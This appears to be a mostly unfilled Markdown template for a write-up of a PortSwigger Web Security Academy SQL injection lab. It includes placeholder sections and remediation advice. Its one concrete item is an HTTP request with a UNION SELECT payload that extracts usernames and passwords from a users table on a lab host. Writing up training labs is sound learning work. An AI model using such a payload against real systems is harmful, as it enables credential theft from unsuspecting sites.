# [SQL Injection]

## Platform
PortSwigger Web Security Academy

## Difficulty
[Apprentice / Practitioner / Expert]

## Vulnerability Category
[e.g., SQL Injection, Cross-Site Scripting, SSRF]

## Lab Objective
State the specific lab objective and target goal (e.g., bypass authentication, exfiltrate sensitive administrator data, execute arbitrary JavaScript).

## Vulnerability Overview
Provide a clear technical explanation of the flaw, how the application handles untrusted input, and the underlying mechanism.

## Methodology
1. Reconnaissance and endpoint analysis.
2. Intercepting requests using Burp Suite Proxy and Repeater.
3. Testing parameter boundaries and response behaviors.

## Exploitation Steps
Step-by-step technical walkthrough of the successful exploit:

1. Locate the vulnerable input parameter.
2. Craft the test payload to verify behavior.
3. Send the finalized exploit payload.

## Payloads
```http
POST /search HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

searchTerm=' UNION SELECT NULL, username || '~' || password FROM users--
```

## Screenshots
<!-- Paste or drag-and-drop screenshots directly into the editor -->
![Exploit Verification](screenshots/exploit-evidence.png)

## Root Cause
Explain the software vulnerability at the code or architectural level (e.g., unparameterized dynamic SQL string concatenation, improper HTML attribute encoding).

## Remediation
Describe how the developers should fix the vulnerability:
- Use parameterized queries / prepared statements.
- Implement context-aware output encoding.
- Enforce strict input validation with allow-lists.

## Key Takeaways
- Key technical insight gained.
- Common evasion or filter-bypass notes.

## References
- [PortSwigger Web Security Academy Documentation](https://portswigger.net/web-security)
